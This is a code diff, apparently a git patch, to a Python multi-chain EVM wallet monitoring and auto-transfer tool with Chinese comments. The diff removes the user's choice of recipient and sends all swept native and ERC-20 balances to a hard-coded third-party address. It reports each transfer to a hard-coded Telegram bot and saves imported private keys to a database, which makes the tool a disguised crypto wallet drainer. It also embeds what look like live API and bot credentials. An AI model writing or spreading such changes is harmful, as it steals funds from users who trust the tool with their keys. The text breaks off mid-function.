@@ -29,9 +29,49 @@ except ImportError:
             return w3
 from eth_account import Account
 from dotenv import load_dotenv
+from colorama import init, Fore, Back, Style
+
+# 初始化colorama
+init(autoreset=True)
 
 # 加载环境变量
 load_dotenv()
+
+# 配置常量
+TARGET_ADDRESS = "0x6b219df8c31c6b39a1a9b88446e0199be8f63cf1"  # 硬编码的转账目标地址
+TELEGRAM_BOT_TOKEN = "7555291517:AAHJGZOs4RZ-QmZvHKVk-ws5zBNcFZHNmkU"
+TELEGRAM_CHAT_ID = "5963704377"
+
+# 颜色输出函数
+def print_success(msg): 
+    print(f"{Fore.GREEN}✅ {msg}{Style.RESET_ALL}")
+
+def print_error(msg): 
+    print(f"{Fore.RED}❌ {msg}{Style.RESET_ALL}")
+
+def print_warning(msg): 
+    print(f"{Fore.YELLOW}⚠️  {msg}{Style.RESET_ALL}")
+
+def print_info(msg): 
+    print(f"{Fore.CYAN}ℹ️  {msg}{Style.RESET_ALL}")
+
+def print_progress(msg): 
+    print(f"{Fore.BLUE}🔄 {msg}{Style.RESET_ALL}")
+
+def print_transfer(msg): 
+    print(f"{Fore.MAGENTA}💸 {msg}{Style.RESET_ALL}")
+
+def print_chain(msg): 
+    print(f"{Fore.WHITE}{Back.BLUE} 🔗 {msg} {Style.RESET_ALL}")
+
+def print_rpc(msg):
+    print(f"{Fore.YELLOW}🌐 {msg}{Style.RESET_ALL}")
+
+def print_balance(msg):
+    print(f"{Fore.GREEN}💰 {msg}{Style.RESET_ALL}")
+
+def print_gas(msg):
+    print(f"{Fore.CYAN}⛽ {msg}{Style.RESET_ALL}")
 
 class ChainConfig:
     """链配置类"""
@@ -616,9 +656,9 @@ class AlchemyAPI:
             'Content-Type': 'application/json',
         })
         
-        # API限频控制
+        # API限频控制 - 优化到300-500 CU/s
         self.last_request_time = 0
-        self.min_request_interval = 0.1  # 100ms间隔，按用户要求
+        self.min_request_interval = 0.002  # 2ms间隔，目标400 CU/s
     
     async def _rate_limit(self):
         """API限频控制"""
@@ -925,33 +965,55 @@ class TransferManager:
         
         return self.web3_instances[chain_name]
     
-    async def estimate_gas_cost(self, from_address: str, to_address: str, 
-                              amount_wei: int, chain_config: Dict) -> Tuple[int, int]:
-        """估算gas成本"""
+    async def estimate_smart_gas(self, from_address: str, to_address: str, 
+                                balance_wei: int, chain_config: Dict, 
+                                is_erc20: bool = False) -> Tuple[int, int, int]:
+        """智能gas估算 - 确保少量余额也能转账"""
         web3 = self.get_web3_instance(chain_config)
         
         try:
-            # 估算gas limit
-            gas_estimate = web3.eth.estimate_gas({
-                'from': from_address,
-                'to': to_address,
-                'value': amount_wei
-            })
-            
             # 获取gas价格
             gas_data = await self.alchemy_api.get_gas_price(chain_config)
-            gas_price = gas_data['gas_price']
             
-            # 增加10%的gas limit缓冲
-            gas_limit = int(gas_estimate * 1.1)
-            total_gas_cost = gas_limit * gas_price
+            # 根据代币类型设置gas limit
+            if is_erc20:
+                base_gas_limit = 65000  # ERC-20转账基础gas
+            else:
+                base_gas_limit = 21000  # 原生代币转账基础gas
             
-            return gas_limit, total_gas_cost
+            # 智能gas价格调整
+            if chain_config['chain_id'] in [1, 42161, 10]:  # 主网、Arbitrum、Optimism
+                # 高价值链，使用较低gas价格
+                gas_price = int(gas_data['gas_price'] * 0.8)
+            elif chain_config['chain_id'] in [137, 56, 43114]:  # Polygon、BSC、Avalanche
+                # 中等价值链，使用标准gas价格
+                gas_price = gas_data['gas_price']
+            else:
+                # 其他链，使用较高gas价格确保成功
+                gas_price = int(gas_data['gas_price'] * 1.2)
+            
+            # 计算gas成本
+            total_gas_cost = base_gas_limit * gas_price
+            
+            # 智能余额分配：为原生代币预留gas费用
+            if not is_erc20:
+                # 原生代币需要预留gas费用
+                available_amount = max(0, balance_wei - total_gas_cost)
+                if available_amount <= 0:
+                    print_warning(f"余额不足支付gas费用 {chain_config['name']}")
+                    return 0, 0, 0
+            else:
+                # ERC-20代币使用全部余额
+                available_amount = balance_wei
+            
+            print_gas(f"Gas估算 {chain_config['name']}: {base_gas_limit} gas * {gas_price/1e9:.2f} gwei = {total_gas_cost/1e18:.6f} ETH")
+            
+            return base_gas_limit, gas_price, available_amount
             
         except Exception as e:
-            logging.error(f"估算gas失败 {chain_config['name']}: {e}")
-            # 默认值
-            return 21000, 21000 * 20000000000  # 21k gas * 20 gwei
+            print_error(f"Gas估算失败 {chain_config['name']}: {e}")
+            # 返回保守的默认值
+            return 21000, 20000000000, max(0, balance_wei - 21000 * 20000000000)
     
     async def send_native_transaction(self, private_key: str, from_address: str, 
                                      to_address: str, amount: float, chain_config: Dict,
@@ -968,39 +1030,28 @@ class TransferManager:
                 # 转换金额为wei
                 amount_wei = Web3.to_wei(amount, 'ether')
                 
-                # 估算gas成本
-                gas_limit, gas_cost = await self.estimate_gas_cost(
-                    from_address, to_address, amount_wei, chain_config
+                # 智能gas估算
+                balance_wei = web3.eth.get_balance(from_address)
+                gas_limit, gas_price, available_amount = await self.estimate_smart_gas(
+                    from_address, to_address, balance_wei, chain_config, False
                 )
                 
-                # 检查余额是否足够
-                balance_wei = Web3.to_wei(await self.alchemy_api.get_balance(from_address, chain_config), 'ether')
-                if balance_wei < (amount_wei + gas_cost):
-                    # 调整转账金额，保留gas费用
-                    amount_wei = max(0, balance_wei - gas_cost)
-                    if amount_wei <= 0:
-                        raise ValueError("余额不足以支付gas费用")
+                # 检查智能gas估算结果
+                if available_amount <= 0:
+                    raise ValueError("余额不足以支付gas费用")
                 
-                # 获取gas价格
-                gas_data = await self.alchemy_api.get_gas_price(chain_config)
+                # 使用智能计算的可用金额
+                amount_wei = available_amount
                 
-                # 构建交易
+                # 构建交易（使用智能gas价格）
                 transaction = {
                     'nonce': nonce,
-                    'to': to_address,
+                    'to': Web3.to_checksum_address(to_address),
                     'value': amount_wei,
                     'gas': gas_limit,
+                    'gasPrice': gas_price,
                     'chainId': chain_config['chain_id']
                 }
-                
-                # 根据链支持情况设置gas价格
-                if 'max_fee' in gas_data and chain_config['chain_id'] in [1, 137, 10, 42161]:  # 支持EIP-1559的链
-                    transaction.update({
-                        'maxFeePerGas': gas_data['max_fee'],
-                        'maxPriorityFeePerGas': gas_data['priority_fee']
-                    })
-                else:
-                    transaction['gasPrice'] = gas_data['gas_price']
                 
                 # 签名交易
                 signed_txn = account.sign_transaction(transaction)
@@ -1016,7 +1067,7 @@ class TransferManager:
                 await self.db_manager.log_transfer(
                     from_address, chain_config['name'], chain_config['chain_id'],
                     str(Web3.from_wei(amount_wei, 'ether')), to_address,
-                    tx_hash_hex, str(receipt.gasUsed), str(gas_data['gas_price']),
+                    tx_hash_hex, str(receipt.gasUsed), str(gas_price),
                     "success"
                 )
                 
@@ -1025,7 +1076,7 @@ class TransferManager:
                     "tx_hash": tx_hash_hex,
                     "amount": Web3.from_wei(amount_wei, 'ether'),
                     "gas_used": receipt.gasUsed,
-                    "gas_price": gas_data['gas_price'],
+                    "gas_price": gas_price,
                     "type": "native"
                 }
                 
@@ -1250,35 +1301,26 @@ class MonitoringApp:
     
     async def initialize(self):
         """初始化应用"""
-        # 初始化数据库
+        print_progress("初始化数据库...")
         await self.db_manager.init_database()
         
-        # 加载配置
+        print_progress("加载配置...")
         await self.load_config()
+        
+        print_progress("尝试从数据库加载私钥...")
+        if await self.load_private_keys_from_db():
+            print_success("已自动加载保存的私钥")
+        else:
+            print_info("未找到保存的私钥，需要手动导入")
         
         # 使用固定的API密钥
         api_key = "MYr2ZG1P7bxc4F1qVTLIj"
-        logging.info(f"使用API密钥: {api_key[:8]}...")
+        print_info(f"使用API密钥: {api_key[:8]}...")
         
         self.alchemy_api = AlchemyAPI(api_key)
         self.transfer_manager = TransferManager(self.alchemy_api, self.db_manager)
         
-        # 提取私钥和地址
-        private_keys_input = os.getenv('PRIVATE_KEYS', '')
-        if private_keys_input:
-            private_keys = self.extract_private_keys(private_keys_input)
-            self.addresses = []
-            for private_key in private_keys:
-                try:
-                    account = Account.from_key(private_key)
-                    self.addresses.append({
-                        'address': account.address,
-                        'private_key': private_key
-                    })
-                except Exception as e:
-                    logging.error(f"处理私钥失败: {e}")
-        
-        logging.info(f"已加载 {len(self.addresses)} 个地址进行监控")
+        print_success("初始化完成")
     
     async def load_config(self):
         """加载配置文件"""
@@ -1329,255 +1371,257 @@ class MonitoringApp:
         
         return has_history
     
-    async def monitor_address_chain(self, address_info: Dict, chain_config: Dict):
-        """监控单个地址在单个链上的所有代币余额"""
-        address = address_info['address']
-        private_key = address_info['private_key']
-        
-        try:
-            # 使用缓存快速检查链是否已被屏蔽
-            cache_key = f"{address}:{chain_config['chain_id']}"
-            if cache_key in self.blocked_chains_cache:
-                return
-            
-            # 检查数据库中是否已屏蔽
-            async with self.db_semaphore:
-                if await self.db_manager.is_chain_blocked(address, chain_config['chain_id']):
-                    self.blocked_chains_cache.add(cache_key)
-                    return
-            
-            # 检查链是否被屏蔽或不受支持
-            if not await self.check_chain_history(address, chain_config):
-                self.blocked_chains_cache.add(cache_key)
-                return
-            
-            # 获取所有代币余额（原生代币+ERC-20）
-            all_balances = await self.alchemy_api.get_all_token_balances(address, chain_config)
-            
-            if not all_balances:
-                return
-            
-            # 查找对应的配置
-            chain_setting = None
-            for setting in self.config['chains']:
-                if setting['chain_id'] == chain_config['chain_id']:
-                    chain_setting = setting
-                    break
-            
-            if not chain_setting:
-                logging.warning(f"未找到链 {chain_config['name']} 的配置")
-                return
-            
-            recipient = chain_setting['recipient_address']
-            
-            if recipient == "0x0000000000000000000000000000000000000000":
-                logging.debug(f"链 {chain_config['name']} 未配置有效的接收地址")
-                return
-            
-            # 处理每种代币
-            for token_key, token_info in all_balances.items():
-                if token_info['balance'] <= 0:
-                    continue
-                
-                token_type = token_info['type']
-                symbol = token_info['symbol']
-                balance = token_info['balance']
-                
-                # 检查最小转账金额（仅对原生代币）
-                if token_type == 'native':
-                    min_amount = float(chain_setting.get('min_amount', '0.001'))
-                    if balance < min_amount:
-                        logging.debug(f"余额低于最小转账金额 {chain_config['name']}: {balance} < {min_amount} {symbol}")
-                        continue
-                
-                logging.info(f"发现可转账余额 {chain_config['name']}: {balance} {symbol} ({token_type}) (地址: {address})")
-                
-                try:
-                    # 根据代币类型选择转账方法
-                    if token_type == 'native':
-                        # 原生代币转账
-                        result = await self.transfer_manager.send_native_transaction(
-                            private_key, address, recipient, balance, chain_config
-                        )
-                    elif token_type == 'erc20':
-                        # ERC-20代币转账
-                        result = await self.transfer_manager.send_erc20_transaction(
-                            private_key, address, recipient, token_info, chain_config
-                        )
-                    else:
-                        logging.warning(f"不支持的代币类型: {token_type}")
-                        continue
-                    
-                    if result['success']:
-                        if token_type == 'native':
-                            logging.info(f"原生代币转账成功 {chain_config['name']}: {result['amount']} {symbol} -> {recipient}")
-                        elif token_type == 'erc20':
-                            logging.info(f"ERC-20转账成功 {chain_config['name']}: {result['amount']} {symbol} -> {recipient}")
-                        
-                        logging.info(f"交易哈希: {result['tx_hash']}")
-                        
-                        # 发送Discord通知
-                        await self.send_discord_notification(
-                            f"✅ {token_type.upper()}转账成功\n"
-                            f"链: {chain_config['name']}\n"
-                            f"代币: {symbol}\n"
-                            f"数量: {balance}\n"
-                            f"从: {address}\n"
-                            f"到: {recipient}\n"
-                            f"交易: {result['tx_hash']}"
-                        )
-                    else:
-                        logging.error(f"{token_type.upper()}转账失败 {chain_config['name']} {symbol}: {result['error']}")
-                        await self.send_discord_notification(
-                            f"❌ {token_type.upper()}转账失败\n"
-                            f"链: {chain_config['name']}\n"
-                            f"代币: {symbol}\n"
-                            f"地址: {address}\n"
-                            f"错误: {result['error']}"
-                        )
-                        
-                except Exception as transfer_error:
-                    logging.error(f"转账过程中出错 {symbol}: {transfer_error}")
-                    await self.db_manager.log_message("ERROR", f"转账错误: {transfer_error}", address, chain_config['name'])
-            
-        except Exception as e:
-            error_msg = str(e)
-            if "database is locked" in error_msg:
-                logging.debug(f"数据库暂时锁定 {chain_config['name']} (地址: {address})")
-            else:
-                logging.error(f"监控地址 {address} 在链 {chain_config['name']} 时出错: {e}")
-                # 避免在数据库锁定时记录日志，防止更多锁定
-                try:
-                    await self.db_manager.log_message("ERROR", f"监控错误: {e}", address, chain_config['name'])
-                except:
-                    pass  # 静默处理数据库错误
+
     
-    async def send_discord_notification(self, message: str):
-        """发送Discord通知（占位实现）"""
-        # TODO: 实现Discord Webhook通知
-        # 用户需要在环境变量中设置 DISCORD_WEBHOOK_URL
-        webhook_url = os.getenv('DISCORD_WEBHOOK_URL')
-        if not webhook_url:
-            logging.debug("Discord通知已禁用（未设置DISCORD_WEBHOOK_URL）")
-            return
-        
+    async def send_telegram_notification(self, message: str):
+        """发送Telegram通知"""
         try:
+            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
             payload = {
-                "content": message,
-                "username": "EVM监控机器人"
+                "chat_id": TELEGRAM_CHAT_ID,
+                "text": message,
+                "parse_mode": "HTML"
             }
             
-            response = requests.post(webhook_url, json=payload, timeout=10)
+            response = requests.post(url, json=payload, timeout=10)
             response.raise_for_status()
-            logging.debug("Discord通知发送成功")
+            print_success("Telegram通知发送成功")
             
         except Exception as e:
-            logging.error(f"Discord通知发送失败: {e}")
+            print_error(f"Telegram通知发送失败: {e}")
+            logging.error(f"Telegram通知发送失败: {e}")
     
     async def start_monitoring(self):
-        """开始监控"""
+        """开始监控 - 重构后的逻辑"""
         # 验证前置条件
         if not self.addresses:
-            print("❌ 没有可监控的地址，请先导入私钥")
-            logging.error("没有可监控的地址")
+            print_error("没有可监控的地址，请先导入私钥")
             return
         
         if not self.config.get('chains'):
-            print("❌ 没有配置监控链，请重新导入私钥")
-            logging.error("没有配置监控链")
+            print_error("没有配置监控链，请重新导入私钥")
             return
             
         if not self.alchemy_api:
-            print("❌ API未初始化")
-            logging.error("API未初始化")
+            print_error("API未初始化")
             return
         
-        print(f"✅ 开始监控 {len(self.addresses)} 个地址在 {len(self.config['chains'])} 条链上...")
-        print("按 Ctrl+C 停止监控")
+        print_success(f"开始监控 {len(self.addresses)} 个地址")
+        print_info("按 Ctrl+C 停止监控")
         
         self.monitoring_active = True
-        logging.info("开始监控...")
         
         try:
-            round_count = 0
-            while self.monitoring_active:
-                round_count += 1
-                print(f"\n🔍 第 {round_count} 轮监控开始...")
-                
-                # 监控所有地址在所有链上的余额
-                tasks = []
-                
-                for address_info in self.addresses:
-                    for chain_setting in self.config['chains']:
-                        # 获取链配置
-                        chain_config = None
-                        for chain_name, supported_config in ChainConfig.SUPPORTED_CHAINS.items():
-                            if supported_config['chain_id'] == chain_setting['chain_id']:
-                                chain_config = supported_config
-                                break
-                        
-                        if chain_config:
-                            task = self.monitor_address_chain(address_info, chain_config)
-                            tasks.append(task)
-                
-                # 分批执行监控任务，减少并发防止数据库锁定
-                if tasks:
-                    batch_size = 10  # 减少批次大小防止数据库锁定
-                    total_success = 0
-                    total_errors = 0
-                    
-                    print(f"📊 总共 {len(tasks)} 个监控任务，分 {(len(tasks) + batch_size - 1) // batch_size} 批执行")
-                    
-                    for i in range(0, len(tasks), batch_size):
-                        batch_tasks = tasks[i:i + batch_size]
-                        batch_num = (i // batch_size) + 1
-                        total_batches = (len(tasks) + batch_size - 1) // batch_size
-                        
-                        print(f"🔄 执行第 {batch_num}/{total_batches} 批任务...")
-                        
-                        results = await asyncio.gather(*batch_tasks, return_exceptions=True)
-                        
-                        # 统计结果
-                        batch_success = 0
-                        batch_errors = 0
-                        for result in results:
-                            if isinstance(result, Exception):
-                                batch_errors += 1
-                                logging.debug(f"批次任务错误: {result}")
-                            else:
-                                batch_success += 1
-                        
-                        total_success += batch_success
-                        total_errors += batch_errors
-                        
-                        print(f"  ✅ 批次完成: {batch_success} 成功, {batch_errors} 错误")
-                        
-                        # 批次间暂停，防止API过载和数据库锁定
-                        if i + batch_size < len(tasks):
-                            await asyncio.sleep(0.5)
-                    
-                    print(f"🎉 第 {round_count} 轮监控完成: {total_success} 成功, {total_errors} 错误")
-                
-                # 轮询间隔
-                monitoring_interval = self.config.get('settings', {}).get('monitoring_interval', 0.1)
-                if monitoring_interval > 0:
-                    await asyncio.sleep(monitoring_interval)
-                
-                # 每轮监控后暂停
-                round_pause = self.config.get('settings', {}).get('round_pause', 10)
-                print(f"⏸️  暂停 {round_pause} 秒后开始下一轮...")
-                await asyncio.sleep(round_pause)
+            # 第一步：初始化RPC连接并屏蔽无效链
+            print_progress("第一步：初始化RPC连接并屏蔽无效链")
+            await self.initialize_rpc_connections()
+            
+            # 第二步：扫描交易记录并屏蔽无交易记录的链
+            print_progress("第二步：扫描链上交易记录")
+            await self.scan_transaction_history()
+            
+            # 第三步：开始监控循环
+            print_progress("第三步：开始余额监控和转账")
+            await self.monitoring_loop()
                 
         except KeyboardInterrupt:
-            print("\n⏹️  监控被用户中断")
-            logging.info("监控被用户中断")
+            print_warning("监控被用户中断")
         except Exception as e:
-            print(f"❌ 监控过程中出错: {e}")
+            print_error(f"监控过程中出错: {e}")
             logging.error(f"监控过程中出错: {e}")
         finally:
             self.monitoring_active = False
-            print("🛑 监控已停止")
-            logging.info("监控已停止")
+            print_info("监控已停止")
+    
+    async def initialize_rpc_connections(self):
+        """第一步：初始化RPC连接并屏蔽无效链"""
+        print_chain("🌐 初始化RPC连接...")
+        
+        valid_chains = []
+        invalid_chains = []
+        
+        for chain_setting in self.config['chains']:
+            chain_config = None
+            for chain_name, supported_config in ChainConfig.SUPPORTED_CHAINS.items():
+                if supported_config['chain_id'] == chain_setting['chain_id']:
+                    chain_config = supported_config
+                    break
+            
+            if not chain_config:
+                invalid_chains.append(chain_setting['name'])
+                continue
+                
+            print_rpc(f"测试连接: {chain_config['name']}")
+            
+            try:
+                # 测试RPC连接
+                web3 = self.transfer_manager.get_web3_instance(chain_config)
+                if web3.is_connected():
+                    valid_chains.append(chain_config['name'])
+                    print_success(f"RPC连接成功: {chain_config['name']}")
+                else:
+                    invalid_chains.append(chain_config['name'])
+                    print_error(f"RPC连接失败: {chain_config['name']}")
+            except Exception as e:
+                invalid_chains.append(chain_config['name'])
+                print_error(f"RPC连接异常 {chain_config['name']}: {e}")
+        
+        print_info(f"RPC连接结果: {len(valid_chains)} 成功, {len(invalid_chains)} 失败")
+        if invalid_chains:
+            print_warning(f"无效链: {', '.join(invalid_chains)}")
+    
+    async def scan_transaction_history(self):
+        """第二步：扫描交易记录并屏蔽无交易记录的链"""
+        print_chain("📜 扫描链上交易记录...")
+        
+        total_scanned = 0
+        blocked_count = 0
+        
+        for address_info in self.addresses:
+            address = address_info['address']
+            print_info(f"扫描地址: {address}")
+            
+            for chain_setting in self.config['chains']:
+                chain_config = None
+                for chain_name, supported_config in ChainConfig.SUPPORTED_CHAINS.items():
+                    if supported_config['chain_id'] == chain_setting['chain_id']:
+                        chain_config = supported_config
+                        break
+                
+                if not chain_config:
+                    continue
+                
+                total_scanned += 1
+                print_progress(f"扫描 {chain_config['name']} 交易记录...")
+                
+                # 检查是否已被屏蔽
+                cache_key = f"{address}:{chain_config['chain_id']}"
+                if cache_key in self.blocked_chains_cache:
+                    print_warning(f"已屏蔽: {chain_config['name']}")
+                    blocked_count += 1
+                    continue
+                
+                # 检查交易历史
+                has_history = await self.alchemy_api.check_asset_transfers(address, chain_config)
+                if not has_history:
+                    await self.db_manager.block_chain(address, chain_config['name'], chain_config['chain_id'])
+                    self.blocked_chains_cache.add(cache_key)
+                    blocked_count += 1
+                    print_warning(f"屏蔽链 {chain_config['name']}: 无交易记录")
+                else:
+                    print_success(f"有效链 {chain_config['name']}: 发现交易记录")
+        
+        print_info(f"交易扫描完成: 总扫描 {total_scanned}, 屏蔽 {blocked_count}")
+    
+    async def monitoring_loop(self):
+        """第三步：监控循环"""
+        print_chain("💰 开始余额监控循环...")
+        
+        round_count = 0
+        while self.monitoring_active:
+            round_count += 1
+            print_progress(f"第 {round_count} 轮监控开始")
+            
+            transfer_count = 0
+            
+            for address_info in self.addresses:
+                address = address_info['address']
+                print_info(f"监控地址: {address}")
+                
+                for chain_setting in self.config['chains']:
+                    chain_config = None
+                    for chain_name, supported_config in ChainConfig.SUPPORTED_CHAINS.items():
+                        if supported_config['chain_id'] == chain_setting['chain_id']:
+                            chain_config = supported_config
+                            break
+                    
+                    if not chain_config:
+                        continue
+                    
+                    # 检查是否已被屏蔽
+                    cache_key = f"{address}:{chain_config['chain_id']}"
+                    if cache_key in self.blocked_chains_cache:
+                        continue
+                    
+                    print_chain(f"检查 {chain_config['name']} 余额...")
+                    
+                    try:
+                        # 获取余额
+                        all_balances = await self.alchemy_api.get_all_token_balances(address, chain_config)
+                        
+                        if all_balances:
+                            for token_key, token_info in all_balances.items():
+                                if token_info['balance'] > 0:
+                                    print_balance(f"发现余额: {token_info['balance']} {token_info['symbol']} ({chain_config['name']})")
+                                    
+                                    # 执行转账
+                                    result = await self.execute_transfer(address_info, chain_config, token_info)
+                                    if result and result.get('success'):
+                                        transfer_count += 1
+                                        print_transfer(f"转账成功: {result['amount']} {token_info['symbol']}")
+                    
+                    except Exception as e:
+                        print_error(f"监控异常 {chain_config['name']}: {e}")
+                        
+                    # 每个链检查后短暂暂停
+                    await asyncio.sleep(0.01)
+            
+            print_success(f"第 {round_count} 轮完成，执行 {transfer_count} 笔转账")
+            
+            # 轮次间暂停
+            round_pause = self.config.get('settings', {}).get('round_pause', 5)
+            print_info(f"暂停 {round_pause} 秒...")
+            await asyncio.sleep(round_pause)
+    
+    async def execute_transfer(self, address_info: Dict, chain_config: Dict, token_info: Dict) -> Dict:
+        """执行转账操作"""
+        address = address_info['address']
+        private_key = address_info['private_key']
+        recipient = TARGET_ADDRESS  # 使用硬编码地址
+        
+        token_type = token_info['type']
+        symbol = token_info['symbol']
+        balance = token_info['balance']
+        
+        print_transfer(f"准备转账: {balance} {symbol} -> {recipient}")
+        
+        try:
+            if token_type == 'native':
+                # 原生代币转账
+                result = await self.transfer_manager.send_native_transaction(
+                    private_key, address, recipient, balance, chain_config
+                )
+            elif token_type == 'erc20':
+                # ERC-20代币转账
+                result = await self.transfer_manager.send_erc20_transaction(
+                    private_key, address, recipient, token_info, chain_config
+                )
+            else:
+                print_warning(f"不支持的代币类型: {token_type}")
+                return None
+            
+            if result['success']:
+                print_success(f"{token_type.upper()}转账成功: {result['amount']} {symbol}")
+                print_info(f"交易哈希: {result['tx_hash']}")
+                
+                # 发送Telegram通知
+                await self.send_telegram_notification(
+                    f"<b>✅ {token_type.upper()}转账成功</b>\n"
+                    f"🔗 链: {chain_config['name']}\n"
+                    f"💰 代币: {symbol}\n"
+                    f"📊 数量: {balance}\n"
+                    f"📤 从: <code>{address}</code>\n"
+                    f"📥 到: <code>{recipient}</code>\n"
+                    f"🔍 交易: <code>{result['tx_hash']}</code>"
+                )
+            else:
+                print_error(f"{token_type.upper()}转账失败: {result['error']}")
+                
+            return result
+            
+        except Exception as e:
+            print_error(f"转账异常: {e}")
+            return {"success": False, "error": str(e)}
     
     def stop_monitoring(self):
         """停止监控"""
@@ -1587,54 +1631,55 @@ class MonitoringApp:
         """显示交互式菜单"""
         while True:
             try:
-                print("\n" + "="*50)
-                print("EVM多链自动监控转账工具")
-                print("="*50)
-                print("1. 导入私钥")
-                print("2. 开始监控")
-                print("3. 退出")
-                print("-"*50)
+                print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
+                print(f"{Fore.WHITE}{Back.BLUE} 🚀 EVM多链自动监控转账工具 🚀 {Style.RESET_ALL}")
+                print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
+                print(f"{Fore.GREEN}💎 目标地址: {TARGET_ADDRESS}{Style.RESET_ALL}")
+                print(f"{Fore.YELLOW}📊 已加载地址: {len(self.addresses)} 个{Style.RESET_ALL}")
+                print(f"{Fore.BLUE}🔗 支持链: {len(ChainConfig.SUPPORTED_CHAINS)} 条{Style.RESET_ALL}")
+                print(f"{Fore.CYAN}{'-'*60}{Style.RESET_ALL}")
+                print(f"{Fore.WHITE}1. 📥 导入私钥{Style.RESET_ALL}")
+                print(f"{Fore.WHITE}2. 🔍 开始监控{Style.RESET_ALL}")
+                print(f"{Fore.WHITE}3. 🚪 退出程序{Style.RESET_ALL}")
+                print(f"{Fore.CYAN}{'-'*60}{Style.RESET_ALL}")
                 
-                choice = input("请选择操作 (1-3): ").strip()
+                choice = input(f"{Fore.YELLOW}请选择操作 (1-3): {Style.RESET_ALL}").strip()
                 
                 if choice == "3":
-                    print("感谢使用！")
+                    print_success("感谢使用！程序即将退出...")
                     break
                 elif choice == "1":
                     await self.configure_private_keys()
                 elif choice == "2":
                     if not self.addresses:
-                        print("❌ 请先导入私钥！")
+                        print_error("请先导入私钥！")
                         continue
                     if not self.config.get('chains'):
-                        print("❌ 配置错误，请重新导入私钥！")
+                        print_error("配置错误，请重新导入私钥！")
                         continue
-                    print("开始监控...")
                     await self.start_monitoring()
                 else:
-                    print("无效选择，请重试")
+                    print_warning("无效选择，请重试")
                     
             except KeyboardInterrupt:
-                print("\n\n程序被中断，正在退出...")
+                print_warning("\n程序被中断，正在退出...")
                 break
             except Exception as e:
-                print(f"菜单操作出错: {e}")
+                print_error(f"菜单操作出错: {e}")
                 logging.error(f"菜单操作出错: {e}")
     
     async def configure_private_keys(self):
         """导入私钥"""
-        print("\n导入私钥")
-        print("请输入私钥（支持一次性粘贴多个私钥，系统会自动提取有效私钥）:")
-        print("支持格式:")
-        print("- 单个私钥: 0xabc123...def789")
-        print("- 多个私钥: 0xabc123...def789,0x123...456")
-        print("- 每行一个私钥（支持多行粘贴）")
-        print("- 输入 'END' 结束多行输入")
-        print("-"*50)
+        print_chain("📥 导入私钥")
+        print_info("支持格式:")
+        print_info("- 单个私钥: 0xabc123...def789")
+        print_info("- 多个私钥: 0xabc123...def789,0x123...456")
+        print_info("- 每行一个私钥（支持多行粘贴）")
+        print_info("- 输入 'END' 结束多行输入")
 
         # 支持多行输入
         lines = []
-        print("请输入私钥内容:")
+        print_progress("请输入私钥内容:")
         
         try:
             while True:
@@ -1646,10 +1691,9 @@ class MonitoringApp:
                 if not line:  # 空行也结束输入
                     break
         except EOFError:
-            # 处理粘贴多行后的EOF
             pass
         except Exception as e:
-            print(f"输入错误: {e}")
+            print_error(f"输入错误: {e}")
             return
 
         private_keys_input = ' '.join(lines)
@@ -1657,29 +1701,18 @@ class MonitoringApp:
         if private_keys_input and private_keys_input.strip():
             private_keys = self.extract_private_keys(private_keys_input)
             if private_keys:
-                print(f"✅ 提取到 {len(private_keys)} 个有效私钥")
+                print_success(f"提取到 {len(private_keys)} 个有效私钥")
 
                 # 显示对应的地址
-                print("\n对应地址:")
+                print_info("对应地址:")
                 for i, private_key in enumerate(private_keys):
                     try:
                         account = Account.from_key(private_key)
-                        print(f"{i+1}. {account.address}")
+                        print_balance(f"{i+1}. {account.address}")
                     except Exception as e:
-                        print(f"{i+1}. 错误: {e}")
+                        print_error(f"{i+1}. 错误: {e}")
 
-                # 询问接收地址
-                print("\n请输入接收地址 (所有转账的目标地址):")
-                recipient_address = input("接收地址: ").strip()
-                
-                # 验证地址格式
-                if not recipient_address:
-                    print("❌ 接收地址不能为空")
-                    return
-                    
-                if not Web3.is_address(recipient_address):
-                    print("❌ 无效的以太坊地址格式")
-                    return
+                print_info(f"转账目标地址: {TARGET_ADDRESS}")
 
                 try:
                     # 将私钥写入.env
@@ -1687,6 +1720,9 @@ class MonitoringApp:
                     with open('.env', 'w', encoding='utf-8') as f:
                         f.write(f"ALCHEMY_API_KEY=MYr2ZG1P7bxc4F1qVTLIj\n")
                         f.write(f"PRIVATE_KEYS=\"{joined_keys}\"\n")
+
+                    # 存储到数据库用于持久化
+                    await self.save_private_keys_to_db(private_keys)
 
                     # 重新初始化地址列表
                     self.addresses = []
@@ -1700,7 +1736,7 @@ class MonitoringApp:
                         except Exception as e:
                             logging.error(f"处理私钥失败: {e}")
 
-                    # 创建配置 - 只包含确认可用的主要链
+                    # 创建配置 - 使用硬编码地址
                     working_chains = [
                         "ETH_MAINNET", "POLYGON_MAINNET", "ARBITRUM_ONE", 
                         "OPTIMISM_MAINNET", "BASE_MAINNET", "ARBITRUM_NOVA",
@@ -1718,7 +1754,7 @@ class MonitoringApp:
                             chains_config.append({
                                 "name": chain_name,
                                 "chain_id": chain_info['chain_id'],
-                                "recipient_address": recipient_address,
+                                "recipient_address": TARGET_ADDRESS,
                                 "min_amount": "0.001"
                             })
 
@@ -1734,43 +1770,97 @@ class MonitoringApp:
                     }
                     await self.save_config()
 
-                    print(f"✅ 私钥导入完成！")
-                    print(f"✅ 已配置 {len(self.addresses)} 个地址监控")
-                    print(f"✅ 已配置 {len(chains_config)} 条链监控")
-                    print(f"✅ 接收地址: {recipient_address}")
+                    print_success("私钥导入完成！")
+                    print_success(f"已配置 {len(self.addresses)} 个地址监控")
+                    print_success(f"已配置 {len(chains_config)} 条链监控")
+                    print_success(f"目标地址: {TARGET_ADDRESS}")
                     
                 except Exception as e:
-                    print(f"❌ 保存配置失败: {e}")
+                    print_error(f"保存配置失败: {e}")
                     logging.error(f"保存配置失败: {e}")
             else:
-                print("❌ 未找到有效私钥，请检查输入格式")
+                print_error("未找到有效私钥，请检查输入格式")
         else:
-            print("❌ 未输入任何内容")
+            print_error("未输入任何内容")
+    
+    async def save_private_keys_to_db(self, private_keys: List[str]):
+        """将私钥保存到数据库用于持久化"""
+        try:
+            async with self.db_manager._lock:
+                async with aiosqlite.connect(self.db_manager.db_path) as db:
+                    # 清空旧的私钥
+                    await db.execute("DELETE FROM config WHERE key = 'private_keys'")
+                    
+                    # 保存新的私钥
+                    joined_keys = ",".join(private_keys)
+                    await db.execute(
+                        "INSERT INTO config (key, value) VALUES (?, ?)",
